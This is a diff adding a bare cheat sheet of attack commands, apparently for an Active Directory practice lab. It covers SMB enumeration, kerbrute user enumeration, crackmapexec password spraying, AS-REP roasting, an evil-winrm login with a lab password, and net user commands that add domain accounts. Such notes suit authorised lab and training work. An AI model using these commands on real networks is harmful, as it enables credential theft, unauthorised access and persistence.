@@ -1,0 +1,49 @@
+Nmap
+sudo nmap -sC -sV -oA nmap.txt 172.31.3.9 -Pn 
+#SMB
+sudo smbclient -L \\\\10.10.189.24\\ -N
+sudo smbmap -H 10.10.189.24 -u anonymous
+
+#Kerbrute
+ ~/go/bin/kerbrute userenum --dc spray.csl -d spray.csl /usr/share/wordlists/rockyou.txt
+
+#SMB bruteforce
+crackmapexec smb 172.31.3.9 -u ad_users -p ad_users --continue-on-success 
+
+#SMB Enumeration
+smbclient.py SPRAY/johana@172.31.1.18
+shares
+
+#SMB share mount
+sudo mount -t cifs -o username=johana //172.31.3.9/spray /mnt/ 
+
+#RCP client enumeration
+rpcclient -U johana 172.31.3.9
+
+
+#
+python2 GetNPUsers.py spray.csl/ -request -usersfile <userfile>  -dc-ip 172.31.3.9
+
+#Bruteforce for SMB & winrm
+
+#crackmapexec smb 172.31.3.9 -u ad_users -p Spray.csl1337 --continue-on-success
+#crackmapexec winrm 172.31.3.9 -u ad_users -p Spray.csl1337 --continue-on-success
+
+#login
+evil-winrm -u hackzzdogs -p 'Spray.csl1337' -i spray.csl
+
+
+net user /domain
+
+net user <username>
+
+net user <username> /domain
+
+net user <username> <password> /add
+
+net user <username> <password> /add /domain
+
+net user <username> <newpassword>
+
+
+
